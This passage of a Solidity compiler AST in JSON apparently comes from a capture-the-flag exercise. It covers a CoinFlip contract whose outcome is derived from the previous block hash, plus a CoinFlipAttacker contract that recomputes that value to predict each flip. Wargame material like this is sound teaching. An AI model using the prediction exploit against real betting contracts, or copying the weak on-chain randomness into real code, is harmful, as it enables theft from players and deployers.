														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "581:60:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 40,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "654:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"id": 41,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "666:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "654:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 47,
												"nodeType": "IfStatement",
												"src": "650:53:0",
												"trueBody": {
													"id": 46,
													"nodeType": "Block",
													"src": "678:25:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 43,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-19,
																		-19
																	],
																	"referencedDeclaration": -19,
																	"src": "687:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 44,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "687:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 45,
															"nodeType": "ExpressionStatement",
															"src": "687:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 50,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 48,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "711:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 28,
														"src": "722:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "711:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 51,
												"nodeType": "ExpressionStatement",
												"src": "711:21:0"
											},
											{
												"assignments": [
													53
												],
												"declarations": [
													{
														"constant": false,
														"id": 53,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 85,
														"src": "739:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 52,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "739:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 58,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 56,
															"name": "FACTOR",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 12,
															"src": "773:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 54,
															"name": "blockValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 28,
															"src": "758:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 55,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "div",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 342,
														"src": "758:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 57,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "758:22:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "739:41:0"
											},
											{
												"assignments": [
													60
												],
												"declarations": [
													{
														"constant": false,
														"id": 60,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 85,
														"src": "787:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 59,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "787:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 67,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 63,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 61,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 53,
															"src": "799:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "31",
															"id": 62,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "811:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "799:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "66616c7365",
														"id": 65,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "822:5:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 66,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "799:28:0",
													"trueExpression": {
														"argumentTypes": null,
														"hexValue": "74727565",
														"id": 64,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "815:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "787:40:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 70,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 68,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "840:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"id": 69,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "848:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "840:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 83,
													"nodeType": "Block",
													"src": "916:57:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 79,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 77,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "925:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 78,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "943:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "925:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 80,
															"nodeType": "ExpressionStatement",
															"src": "925:19:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "960:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 26,
															"id": 82,
															"nodeType": "Return",
															"src": "953:12:0"
														}
													]
												},
												"id": 84,
												"nodeType": "IfStatement",
												"src": "836:137:0",
												"trueBody": {
													"id": 76,
													"nodeType": "Block",
													"src": "856:54:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 72,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "865:17:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "865:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 73,
															"nodeType": "ExpressionStatement",
															"src": "865:17:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "74727565",
																"id": 74,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "898:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 26,
															"id": 75,
															"nodeType": "Return",
															"src": "891:11:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"functionSelector": "1d263f67",
									"id": 86,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 22,
												"mutability": "mutable",
												"name": "_guess",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 86,
												"src": "539:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 21,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "539:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "538:13:0"
									},
									"returnParameters": {
										"id": 26,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 25,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 86,
												"src": "568:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 24,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "568:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "567:6:0"
									},
									"scope": 87,
									"src": "525:453:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 217,
							"src": "255:726:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 95,
							"linearizedBaseContracts": [
								95
							],
							"name": "CoinFlipInterface",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "1d263f67",
									"id": 94,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 90,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 89,
												"mutability": "mutable",
												"name": "_guess",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 94,
												"src": "1115:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 88,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1115:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1114:13:0"
									},
									"returnParameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 92,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 94,
												"src": "1146:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 91,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1146:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1145:6:0"
									},
									"scope": 95,
									"src": "1101:51:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 217,
							"src": "1066:89:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 216,
							"linearizedBaseContracts": [
								216
							],
							"name": "CoinFlipAttacker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 98,
									"libraryName": {
										"contractScope": null,
										"id": 96,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 412,
										"src": "1203:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$412",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "1197:27:0",
									"typeName": {
										"id": 97,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "1216:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"id": 100,
									"mutability": "mutable",
									"name": "addr",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 216,
									"src": "1230:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 99,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "1230:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 102,
									"mutability": "mutable",
									"name": "cf_ins",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 216,
									"src": "1257:15:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$87",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"contractScope": null,
										"id": 101,
										"name": "CoinFlip",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 87,
										"src": "1257:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$87",
											"typeString": "contract CoinFlip"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 104,
									"mutability": "mutable",
									"name": "cf_interface",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 216,
									"src": "1279:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlipInterface_$95",
										"typeString": "contract CoinFlipInterface"
									},
									"typeName": {
										"contractScope": null,
										"id": 103,
										"name": "CoinFlipInterface",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 95,
										"src": "1279:17:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlipInterface_$95",
											"typeString": "contract CoinFlipInterface"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 107,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 216,
									"src": "1318:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 105,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "1318:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 106,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "1335:77:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 128,
										"nodeType": "Block",
										"src": "1455:116:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 112,
														"name": "addr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 100,
														"src": "1466:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 113,
														"name": "_addr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 109,
														"src": "1473:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "1466:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "1466:12:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 120,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 116,
														"name": "cf_ins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 102,
														"src": "1489:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$87",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 118,
																"name": "_addr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 109,
																"src": "1507:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 117,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 87,
															"src": "1498:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$87_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 119,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1498:15:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$87",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "1489:24:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$87",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 121,
												"nodeType": "ExpressionStatement",
												"src": "1489:24:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 126,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 122,
														"name": "cf_interface",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 104,
														"src": "1524:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlipInterface_$95",
															"typeString": "contract CoinFlipInterface"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 124,
																"name": "_addr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 109,
																"src": "1557:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 123,
															"name": "CoinFlipInterface",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 95,
															"src": "1539:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlipInterface_$95_$",
																"typeString": "type(contract CoinFlipInterface)"
															}
														},
														"id": 125,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1539:24:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlipInterface_$95",
															"typeString": "contract CoinFlipInterface"
														}
													},
													"src": "1524:39:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlipInterface_$95",
														"typeString": "contract CoinFlipInterface"
													}
												},
												"id": 127,
												"nodeType": "ExpressionStatement",
												"src": "1524:39:0"
											}
										]
									},
									"documentation": null,
									"id": 129,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 110,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 109,
												"mutability": "mutable",
												"name": "_addr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 129,
												"src": "1433:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 108,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1433:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1432:15:0"
									},
									"returnParameters": {
										"id": 111,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1455:0:0"
									},
									"scope": 216,
									"src": "1421:150:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 165,
										"nodeType": "Block",
										"src": "1738:204:0",
										"statements": [
											{
												"assignments": [
													135
												],
												"declarations": [
													{
														"constant": false,
														"id": 135,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 165,
														"src": "1749:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 134,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1749:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 146,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 142,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "1805:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 139,
																				"name": "block",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -4,
																				"src": "1788:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_block",
																					"typeString": "block"
																				}
																			},
																			"id": 140,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "number",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "1788:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 141,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 262,
																		"src": "1788:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 143,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1788:19:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 138,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -5,
																"src": "1778:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 144,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1778:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 137,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "1770:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 136,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1770:7:0",
															"typeDescriptions": {
